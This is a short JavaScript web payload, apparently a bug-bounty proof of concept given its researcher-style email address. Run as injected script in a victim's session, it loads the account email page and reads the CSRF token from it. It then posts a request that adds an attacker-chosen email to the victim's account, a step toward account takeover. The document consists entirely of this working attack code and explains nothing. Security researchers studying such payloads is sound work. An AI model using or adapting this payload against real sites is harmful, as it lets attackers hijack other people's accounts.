var url = "/accounts/email/";
var email = "razii%2b1@wearehackerone.com";
var xhr = new XMLHttpRequest();
    xhr.responseType = "document";
    xhr.open("GET", url, true);
    xhr.onload = function (e) {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            page = xhr.response

	token = page.getElementsByName("csrfmiddlewaretoken")[0].value;

	var http = new XMLHttpRequest();
	http.open("POST", "/accounts/email/", true);
	http.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	http.send('csrfmiddlewaretoken='+token+'&email='+email+'&action_add=');
        }
    };

xhr.send(null);
